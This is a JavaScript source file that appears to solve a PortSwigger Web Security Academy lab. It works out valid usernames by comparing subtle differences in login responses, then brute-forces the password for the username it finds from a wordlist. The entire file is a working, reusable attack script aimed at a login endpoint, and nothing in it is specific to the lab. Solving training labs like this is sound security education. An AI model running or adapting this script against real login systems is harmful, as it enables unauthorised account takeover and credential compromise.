import axios from "axios";
import * as fs from "fs";
// import fetch from "node-fetch";

const subdomain = "ac741fe71f067bd3c0a71d6f00820008";
const loginURL = `https://${subdomain}.web-security-academy.net/login`;

const attack = async () => {
  const usernameCandidates = fs
    .readFileSync(__dirname + "/username_candidates.txt")
    .toString()
    .split("\n");

  const passwordCandidates = fs
    .readFileSync(__dirname + "/password_candidates.txt")
    .toString()
    .split("\n");

  let validUsername;
  let responseData;
  let responseStatusText;
  let responseStatus;

  for (let usernameCandidate of usernameCandidates) {
    try {
      const requestTime = new Date().getTime() / 1000;
      const response = await axios.post(
        loginURL,
        `username=${usernameCandidate}&password=123`
      );
      const newResponseData = response.data
        .replace("<!-- -->\n", "")
        // .replace(/\n    <script>.*fetch(.*)/, "")
        // .replace(/\n  <script>.*fetch(.*)/, "")
        .replace(/\n.*<script>.*fetch(.*)/, "");
      if (!responseData) {
        responseData = newResponseData;
      } else {
        if (responseData !== newResponseData) {
          console.log("Response data is different");
          console.log("Diff 1: ", responseData);
          console.log("Diff 2: ", newResponseData);
          validUsername = usernameCandidate;
        }
      }
      const timeOfResponse = new Date().getTime() / 1000;
      // console.log(usernameCandidate, new Date().getTime() / 1000 - requestTime);

      // console.log(usernameCandidate, response.headers);

      if (!responseStatusText) {
        responseStatusText = response.statusText;
      } else {
        if (responseStatusText !== response.statusText) {
          console.log("Response status text is different");
          console.log("Diff 1: ", responseStatusText);
          console.log("Diff 2: ", response.statusText);
          validUsername = usernameCandidate;
        }
      }

      if (!responseStatus) {
        responseStatus = response.status;
      } else {
        if (responseStatus !== response.status) {
          console.log("Response status is different");
          console.log("Diff 1: ", responseStatus);
          console.log("Diff 2: ", response.status);
          validUsername = usernameCandidate;
        }
      }
    } catch (e) {
      console.log(e);
      throw e;
    }
  }

  for (let passwordCandidate of passwordCandidates) {
    const response = await axios.post(
      loginURL,
      `username=${validUsername}&password=${[passwordCandidate]}`
    );
    // console.log(response);

    if (!response.data.includes("Invalid username or password")) {
      console.log(
        "Username and password is: ",
        validUsername,
        " ",
        passwordCandidate
      );
      break;
    }
  }
};

try {
  attack();
} catch (e) {
  console.log(e);
  throw e;
}
